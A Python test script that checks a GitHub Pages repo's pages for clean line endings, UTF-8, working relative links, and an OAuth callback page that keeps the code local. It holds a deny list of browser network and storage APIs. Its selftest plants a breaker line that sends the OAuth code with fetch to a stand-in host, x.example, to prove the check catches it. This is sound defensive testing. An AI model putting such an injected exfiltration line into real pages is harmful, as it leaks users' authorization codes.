#!/usr/bin/env python3
"""Mechanical checks for lessons promoted from tasks/lessons.md.

Each check guards a rule for this repo's public pages (GitHub Pages: landing,
OAuth callback, EULA, privacy). Python stdlib only.

    python3 scripts/lessons_proof.py            # run every check on the repo
    python3 scripts/lessons_proof.py --selftest # plant a breaker per check, show each fails

Exit status is 0 when every check passes, 1 otherwise.
"""
import os
import re
import shutil
import subprocess
import sys
import tempfile
from html.parser import HTMLParser

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TEXT_EXT = (".html", ".md", ".py", ".yml", ".yaml", ".txt", ".css", ".js", ".json")


def git(root, *args):
    return subprocess.run(["git", "-C", root, *args], check=True,
                          capture_output=True, text=True).stdout


def tracked(root):
    return [p for p in git(root, "ls-files", "-z").split("\0") if p]


def read(root, path):
    with open(os.path.join(root, path), "rb") as f:
        return f.read()


def html_files(root):
    return [p for p in tracked(root) if p.endswith(".html")]


class Refs(HTMLParser):
    """Collects href/src/action values and <meta> tags."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.refs, self.metas, self.tags = [], [], []

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        self.tags.append((tag, a))
        for k in ("href", "src", "action"):
            if a.get(k) is not None:
                self.refs.append((tag, k, a[k]))
        if tag == "meta":
            self.metas.append(a)


def parse(root, path):
    p = Refs()
    p.feed(read(root, path).decode("utf-8", "replace"))
    return p


# ---------------------------------------------------------------- checks
# Each returns a list of problem strings (empty = pass).

def check_eol(root):
    """No tracked text file is CRLF or mixed in the index."""
    bad = []
    for line in git(root, "ls-files", "--eol").splitlines():
        meta, _, path = line.partition("\t")
        idx = meta.split()[0] if meta.split() else ""
        if idx in ("i/crlf", "i/mixed"):
            bad.append(f"{path}: {idx} in the index (use LF only)")
    attrs = read(root, ".gitattributes").decode("utf-8", "replace") \
        if ".gitattributes" in tracked(root) else ""
    if not re.search(r"^\*\s+text=auto\s+eol=lf\s*$", attrs, re.M):
        bad.append(".gitattributes: lost '* text=auto eol=lf' (git would accept CRLF again)")
    return bad


def check_encoding(root):
    """Text files are valid UTF-8; each HTML page declares <meta charset="utf-8"> early."""
    bad = []
    for path in tracked(root):
        if not path.endswith(TEXT_EXT):
            continue
        data = read(root, path)
        try:
            data.decode("utf-8")
        except UnicodeDecodeError as e:
            bad.append(f"{path}: not valid UTF-8 ({e})")
            continue
        if path.endswith(".html"):
            head = data[:1024].decode("utf-8", "replace").lower()
            if not re.search(r'<meta\s+charset=["\']?utf-8', head):
                bad.append(f'{path}: no <meta charset="utf-8"> in the first 1024 bytes')
    return bad


def _local_target(ref):
    """Return the path a relative link points at, or None if it is not a local file link."""
    if re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*:", ref) or ref.startswith("//"):
        return None  # http:, https:, mailto:, javascript:, data:, protocol-relative
    ref = ref.split("#", 1)[0].split("?", 1)[0]
    if ref == "":
        return None  # same-page anchor
    return ref


def check_links(root):
    """Every relative link in the pages resolves to a tracked file."""
    files = set(tracked(root))
    bad = []
    for path in html_files(root):
        base = os.path.dirname(path)
        for tag, attr, ref in parse(root, path).refs:
            target = _local_target(ref)
            if target is None:
                continue
            if target.startswith("/"):
                bad.append(f"{path}: <{tag} {attr}=\"{ref}\"> is root-absolute; "
                           "use a relative link (the site is served under a project path)")
                continue
            resolved = os.path.normpath(os.path.join(base, target))
            if target.endswith("/") or resolved == ".":
                resolved = os.path.normpath(os.path.join(resolved, "index.html"))
            if resolved not in files:
                bad.append(f"{path}: <{tag} {attr}=\"{ref}\"> -> {resolved} is not a tracked file")
    return bad


def check_legal_links(root):
    """The landing page links the EULA and the privacy policy; each legal page links the other."""
    need = {"index.html": ["eula.html", "privacy.html"],
            "callback.html": ["eula.html", "privacy.html"],
            "eula.html": ["privacy.html"],
            "privacy.html": ["eula.html"]}
    files = set(tracked(root))
    bad = []
    for page, targets in need.items():
        if page not in files:
            bad.append(f"{page}: missing")
            continue
        hrefs = {r for t, k, r in parse(root, page).refs if t == "a" and k == "href"}
        for t in targets:
            if t not in hrefs and "./" + t not in hrefs:
                bad.append(f"{page}: no link to {t}")
    return bad


def check_callback(root):
    """callback.html keeps its OAuth behaviour: shows the code locally and sends it nowhere."""
    path = "callback.html"
    if path not in tracked(root):
        return [f"{path}: missing"]
    src = read(root, path).decode("utf-8", "replace")
    p = parse(root, path)
    bad = []
    metas = {(m.get("name") or "").lower(): (m.get("content") or "").lower() for m in p.metas}
    if metas.get("referrer") != "no-referrer":
        bad.append(f'{path}: lost <meta name="referrer" content="no-referrer"> (the code would leak in Referer)')
    if "noindex" not in metas.get("robots", ""):
        bad.append(f'{path}: lost <meta name="robots" content="noindex">')
    for param in ("code", "realmId", "state", "error"):
        if f'q.get("{param}")' not in src:
            bad.append(f'{path}: no longer reads the "{param}" query parameter')
    if not re.search(r"history\.replaceState\(", src):
        bad.append(f"{path}: no longer strips the one-time code from the URL (history.replaceState)")
    for word in ("fetch(", "XMLHttpRequest", "sendBeacon", "WebSocket", "EventSource",
                 ".innerHTML", "outerHTML", "document.write", "eval(", "postMessage",
                 "localStorage", "sessionStorage", "document.cookie"):
        if word in src:
            bad.append(f"{path}: uses {word} (the page must only show the code, never send or store it)")
    for tag, a in p.tags:
        if tag == "script" and a.get("src"):
            bad.append(f"{path}: loads a script ({a['src']}); keep all script inline")
        if tag == "form":
            bad.append(f"{path}: has a <form> (the code must not be submitted anywhere)")
    return bad


def check_self_contained(root):
    """No page loads anything from another site, sets cookies or stores data (README promise)."""
    bad = []
    for path in html_files(root):
        p = parse(root, path)
        for tag, attr, ref in p.refs:
            if tag == "a":
                continue  # outbound links are fine; loading resources is not
            if re.match(r"^(https?:)?//", ref, re.I):
                bad.append(f"{path}: <{tag} {attr}=\"{ref}\"> loads from another site")
        src = read(root, path).decode("utf-8", "replace")
        if re.search(r"@import|url\(\s*['\"]?(https?:)?//", src, re.I):
            bad.append(f"{path}: CSS loads from another site")
        for word in ("document.cookie", "localStorage", "sessionStorage", "indexedDB"):
            if word in src:
                bad.append(f"{path}: uses {word} (no cookies or storage)")
    if ".nojekyll" not in tracked(root):
        bad.append(".nojekyll: missing (GitHub Pages would run Jekyll)")
    return bad


CHECKS = {
    "eol": check_eol,
    "encoding": check_encoding,
    "links": check_links,
    "legal_links": check_legal_links,
    "callback": check_callback,
    "self_contained": check_self_contained,
}


def run(root, names=None):
    failed = 0
    for name in names or CHECKS:
        problems = CHECKS[name](root)
        print(f"{'FAIL' if problems else 'ok  '} {name}")
        for p in problems:
            print(f"     {p}")
        failed += bool(problems)
    return failed


# -------------------------------------------------------------- selftest

def _edit(path, old, new):
    with open(path, encoding="utf-8", newline="") as f:
        s = f.read()
    if old not in s:
        raise SystemExit(f"selftest: breaker anchor {old!r} not found in {path}")
    with open(path, "w", encoding="utf-8", newline="") as f:
        f.write(s.replace(old, new, 1))


def _write(path, data):
    with open(path, "wb") as f:
        f.write(data)


def _crlf(d, path, count=-1):
    # Mark the file -text so .gitattributes no longer normalizes it, as a careless
    # attribute edit would, then plant CRLF.
    with open(os.path.join(d, ".gitattributes"), "a", encoding="utf-8") as f:
        f.write(f"{path} -text\n")
    _write(os.path.join(d, path), read(d, path).replace(b"\n", b"\r\n", count))


BREAKERS = [
    ("eol", "CRLF page", lambda d: _crlf(d, "index.html")),
    ("eol", "mixed endings", lambda d: _crlf(d, "eula.html", 3)),
    ("eol", "LF attribute dropped", lambda d: os.remove(os.path.join(d, ".gitattributes"))),
    ("encoding", "Latin-1 byte", lambda d: _write(os.path.join(d, "README.md"),
                                                  read(d, "README.md") + b"caf\xe9\n")),
    ("encoding", "charset dropped", lambda d: _edit(os.path.join(d, "privacy.html"),
                                                    '<meta charset="utf-8">\n', "")),
    ("links", "dead link", lambda d: _edit(os.path.join(d, "index.html"),
                                           'href="eula.html"', 'href="terms.html"')),
    ("links", "root-absolute link", lambda d: _edit(os.path.join(d, "eula.html"),
                                                    'href="./"', 'href="/"')),
    ("legal_links", "privacy unlinked from landing",
     lambda d: _edit(os.path.join(d, "index.html"),
                     '<li><a href="privacy.html">Privacy Policy</a></li>', "")),
    ("callback", "referrer meta dropped",
     lambda d: _edit(os.path.join(d, "callback.html"),
                     '<meta name="referrer" content="no-referrer">\n', "")),
    ("callback", "code sent to a server",
     lambda d: _edit(os.path.join(d, "callback.html"),
                     'box.value = line.toString();',
                     'box.value = line.toString(); fetch("https://x.example/?" + line);')),
    ("callback", "URL no longer cleaned",
     lambda d: _edit(os.path.join(d, "callback.html"),
                     "window.history.replaceState(null", "void(null")),
    ("self_contained", "external script",
     lambda d: _edit(os.path.join(d, "index.html"), "</head>",
                     '<script src="https://cdn.example.com/a.js"></script>\n</head>')),
    ("self_contained", ".nojekyll removed", lambda d: os.remove(os.path.join(d, ".nojekyll"))),
]


def selftest():
    files = tracked(ROOT)
    ok = True
    for name, label, breaker in BREAKERS:
        with tempfile.TemporaryDirectory() as d:
            for p in files:
                os.makedirs(os.path.join(d, os.path.dirname(p)), exist_ok=True)
                shutil.copy2(os.path.join(ROOT, p), os.path.join(d, p))
            git(d, "init", "-q")
            git(d, "config", "core.autocrlf", "false")
            git(d, "add", "-A")
            clean = CHECKS[name](d)
            if clean:
                print(f"FAIL selftest {name}: clean copy already fails: {clean}")
                ok = False
                continue
            breaker(d)
            git(d, "add", "-A")
            problems = CHECKS[name](d)
            if problems:
                print(f"ok   selftest {name} [{label}] -> caught: {problems[0]}")
            else:
                print(f"FAIL selftest {name} [{label}]: breaker was not caught")
                ok = False
    missing = set(CHECKS) - {n for n, _, _ in BREAKERS}
    if missing:
        print(f"FAIL selftest: no breaker for {sorted(missing)}")
        ok = False
    return 0 if ok else 1


if __name__ == "__main__":
    if "--selftest" in sys.argv[1:]:
        sys.exit(selftest())
    sys.exit(1 if run(ROOT) else 0)
